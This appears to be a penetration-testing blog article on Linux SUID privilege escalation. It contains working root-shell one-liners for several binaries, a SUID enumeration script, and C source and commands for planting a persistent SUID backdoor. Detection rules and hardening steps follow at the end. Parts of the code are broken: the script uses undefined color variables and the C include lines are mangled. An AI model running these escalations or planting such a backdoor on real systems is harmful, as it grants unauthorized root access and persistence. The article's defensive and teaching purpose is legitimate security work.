---
title: SUID Abuse — Escalating to Root with Forgotten Binaries
date: 2025-01-14T00:00:00.000Z
description: >-
  How misconfigured SUID binaries on Linux can be weaponized for privilege
  escalation using GTFOBins techniques and custom enumeration scripts.
category: privesc
os:
  - linux
difficulty: medium
mitre_tactic: TA0004
mitre_technique: T1548.001
tags:
  - suid
  - linux
  - privesc
  - gtfobins
  - setuid
  - enumeration
status: published
lang: en
readingTime: 9
lang_original: pt
translated: true
translated_at: '2026-03-04'
---

## What is SUID?

The **SUID (Set User ID)** bit is a special Linux permission that causes an executable to run with the **privileges of the file owner** instead of the user who invoked it.

When a binary owned by `root` has the SUID bit set, any user who executes it gains temporary root-level access for the duration of that process. This is intentional for binaries such as `/usr/bin/passwd` — but becomes a critical attack vector when found in unexpected binaries.

```bash
# Permission example — the &#x27;s&#x27; in the owner&#x27;s execute position = SUID enabled
-rwsr-xr-x 1 root root 67816 Jan  5 12:00 /usr/bin/passwd
```

&gt; **MITRE ATT&amp;CK;:** This technique is mapped as [T1548.001 — Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) under the Privilege Escalation tactic (TA0004).

---

## Step 1 — Enumerate SUID Binaries

The first step is to find all SUID-enabled binaries on the system.

```bash
# Find all SUID binaries (suppress permission denied errors)
find / -perm -u=s -type f 2&gt;/dev/null

# Limit the search to common binary paths for faster speed
find /usr/bin /sbin /opt /home -perm -u=s -type f 2&gt;/dev/null

# Also checks SGID binaries (runs as group owner)
find / -perm -g=s -type f 2&gt;/dev/null
```

A clean system will return a short and predictable list. Look for anything **unusual**—non-standard paths, custom scripts, or development tools.

---

## Step 2 — Cross-referencing with GTFOBins

[GTFOBins](https://gtfobins.github.io/) is the definitive reference for Unix binaries that can be abused when given elevated permissions.

### find

```bash
# Check if SUID is enabled
ls -la $(which find)
# -rwsr-xr-x 1 root root 204112 ... /usr/bin/find

# Exploit — spawns a root shell
find . -exec /bin/sh -p \; -quit

# Check escalation
whoami
# root
```

The `-p` flag is critical — it tells `sh` to **preserve the effective UID** instead of discarding it.

### vim / vi

```bash
# Check
ls -la $(which vim)

# Method 1: via Python3 extension
vim -c &#x27;:py3 import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-pc&quot;, &quot;reset; exec sh -p&quot;)&#x27;

# Method 2: direct shell spawn
vim -c &#x27;:!sh -p&#x27;

# Method 3: via shell escape in normal mode (inside vim)
# :set shell=/bin/sh
# :shell
```

### python / python3

```bash
python3 -c &#x27;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27;

# Also works in older python2
python -c &#x27;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27;
```

### bash

```bash
# Only exploitable if SUID is on bash itself (rare, but happens in CTFs)
ls -la /bin/bash
# -rwsr-xr-x 1 root root ...

bash -p
# bash-5.1# whoami
# root
```

### nmap (legacy versions &lt; 5.35)

```bash
# Interactive mode available in older versions of nmap
nmap --interactive
nmap&gt; !sh
```

### tar

```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

### perl

```bash
perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27;
```

### awk

```bash
awk &#x27;BEGIN {system(&quot;/bin/sh -p&quot;)}&#x27;
```

### less / more

```bash
# Inside the less/more pager
less /etc/passwd
# Then type:
!/bin/sh
```

---

## Step 3 — Automated Enumeration Script

The following script cross-references discovered SUID binaries with a list of known exploitable ones and generates prioritized targets.

```bash
#!/usr/bin/env bash
# suid_hunter.sh — SUID enumeration and screening
# Usage: ./suid_hunter.sh
# Author: r3d/ops | KBM Security

RED=&#x27;\033[0;31m&#x27;
YEL=&#x27;\033[0;33m&#x27;
GRN=&#x27;\033[0;32m&#x27;
BLU=&#x27;\033[0;34m&#x27;
RST=&#x27;\033[0m&#x27;

KNOWN_EXPLOITABLE=&quot;nmap|vim|vi|find|python|python3|bash|perl|ruby|tar|wget|curl&quot;
KNOWN_EXPLOITABLE+=&quot;|nc|netcat|awk|less|more|man|ftp|gdb|strace|ltrace|tclsh&quot;
KNOWN_EXPLOITABLE+=&quot;|env|expect|lua|php|ruby|node|git|zip|unzip|7z|aria2c&quot;

echo -e &quot;${BLU}[*] SUID Binary Hunter — r3d/ops${RST}&quot;
echo -e &quot;${BLU}[*] Scanning the filesystem...${RST}\n&quot;

BINS=$(find / -perm -u=s -type f 2&gt;/dev/null)
TOTAL=$(echo &quot;$BINS&quot; | wc -l)

echo -e &quot;[*] Found ${YEL}${TOTAL}${RST} SUID binaries\n&quot;
echo -e &quot;[*] Checking against the list of known exploits...\n&quot;

HIT=0
while IFS= read -r bin; do
  name=$(basename &quot;$bin&quot;)
  owner=$(stat -c &#x27;%U&#x27; &quot;$bin&quot; 2&gt;/dev/null)
  perms=$(stat -c &#x27;%A&#x27; &quot;$bin&quot; 2&gt;/dev/null)

  if echo &quot;$name&quot; | grep -qiE &quot;$KNOWN_EXPLOITABLE&quot;; then
    echo -e &quot;  ${RED}[!!!] EXPLOITABLE:${RST} $bin&quot;
    echo -e &quot;       Owner: ${YEL}${owner}${RST} | Perm: ${perms}&quot;
    echo -e &quot;       GTFOBins: ${BLU}https://gtfobins.github.io/gtfobins/${name}/#suid${RST}\n&quot;
    HIT=$((HIT + 1))
  else
    echo -e &quot;  ${GREEN}[ok]${RST}  $bin  ${BLUE}(${owner})${RST}&quot;
  fi
done &lt;&lt;&lt; &quot;$BINS&quot;

echo -e &quot;\n[*] Summary: ${RED}${HIT} potential target(s)${RST} out of ${TOTAL} SUID binaries in total&quot;
```

---

## Step 4 — Writing a Custom SUID Backdoor (Lab Scenario)

In authorized red team operations, you may need to plant a persistent SUID shell for post-exploitation access.

```bash
# As root — compile a minimal setuid wrapper for the shell
cat &gt; /tmp/rootshell.c &lt;&lt; &#x27;EOF&#x27;
#include 
<stdio.h>#include<unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;, NULL);
    return 0;
}
EOF

# Compile and set SUID
gcc /tmp/rootshell.c -o /tmp/rootshell
chmod u+s /tmp/rootshell

# A low-privileged user can now call it
/tmp/rootshell
# bash-5.1# whoami
# root
```

&gt; **DANGER:** Never deploy SUID backdoors on production systems or without explicit written authorization. This is only for authorized lab environments.

---

## Detection &amp; Mitigation

### Blue Team Detections

| Indicator | Data Source | Rule Logic |
|-----------|-------------|------------|
| New SUID binary created | auditd / inotify | `find / -newer /tmp -perm -4000` |
| SUID binary executes shell | auditd execve | parent=suid_binary, child=/bin/sh |
| Unexpected SUID owner | file integrity | owner=root AND path NOT IN baseline |
| `-p` flag passed to shell | process args | `sh -p` OR `bash -p` in cmdline |

### Hardening Commands

```bash
# Audit all SUID binaries — save a baseline
find / -perm -4000 -type f 2&gt;/dev/null &gt; /root/suid_baseline.txt

# Remove SUID from a specific binary
chmod u-s /path/to/binary

# Mount partitions with nosuid to prevent SUID on those filesystems
# In /etc/fstab:
# /dev/sdb1 /data ext4 defaults,nosuid,noexec 0 0

# AppArmor profile enforcement
aa-enforce /usr/bin/find

# Verify binary integrity against the package manager
dpkg --verify    # Debian/Ubuntu
rpm -Va          # RHEL/CentOS
```

### Recommended Monitoring Rules (auditd)

```bash
# /etc/audit/rules.d/suid.rules

# Monitor SUID binary execution
-a always,exit -F arch=b64 -S execve -F euid=0 -F auid&gt;=1000 -k suid_exec

# Monitor chmod/chown changing the SUID bit
-a always,exit -F arch=b64 -S chmod -S fchmod -S fchmodat -F a1=04755 -k suid_create
```

---

## Lab Setup

To practice these techniques safely, spin up a vulnerable VM:

```bash
# Vagrant — intentionally vulnerable Linux box
vagrant init bento/ubuntu-22.04
vagrant up
vagrant ssh

# Manually configure a vulnerable binary for practice
sudo chmod u+s /usr/bin/find
find . -exec /bin/sh -p \; -quit
```

Alternatively, use dedicated platforms:
- **HackTheBox** — Privilege escalation machines on Linux
- **TryHackMe** — &quot;Linux PrivEsc&quot; room
- **VulnHub** — Kioptrix, Mr. Robot series

---

## Summary

| Binary | Exploit Method | Difficulty |
|--------|---------------|------------|
| `find` | `-exec /bin/sh -p` | Easy |
| `python3` | `os.execl(&quot;/bin/sh&quot;,&quot;sh&quot;,&quot;-p&quot;)` | Easy |
| `vim` | `:!sh -p` | Easy |
| `bash` | `bash -p` | Easy |
| `tar` | `--checkpoint-action=exec` | Medium |
| `nmap` | `--interactive` (legacy) | Medium |
| `awk` | `system(&quot;/bin/sh&quot;)` | Easy |

The key takeaway from all this: **any** SUID-enabled binary that allows arbitrary code execution or shell spawn is a path to root. Always enumerate SUID binaries as part of your Linux privilege escalation checklist.</unistd.h></stdio.h>
